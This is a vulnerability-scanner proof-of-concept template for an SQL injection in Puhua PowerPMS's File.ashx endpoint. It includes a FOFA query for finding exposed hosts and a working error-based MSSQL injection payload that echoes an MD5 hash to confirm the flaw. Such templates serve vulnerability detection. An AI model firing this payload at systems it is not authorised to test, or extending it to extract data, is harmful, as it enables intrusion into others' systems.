id: poc-yaml-powerpms-file-ashx-sqli
info:
  name: 普华 PowerPMS File.ashx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: powerpms
  fofa: body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
variables:
  action: 'download

    browser

    topdf

    delete

    '
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /PowerPlat/Control/File.ashx
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: NoCheckSession=true&ServerOperatorType=OpenRecord&_fileid='and+1<sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--&_type=ftp&action=topdf&sessionid=1
  expression: 'status_code == 200 &&

    contains(body,"0x" + t2) &&

    contains(body,"\"success\":false") &&

    contains(body,"\"detail\":") &&

    !contains(body,"<") &&

    matches(body,"转换成数据类型(.*?)时失败") &&

    matches(body,"在将(.*?)值")

    '
transport: http
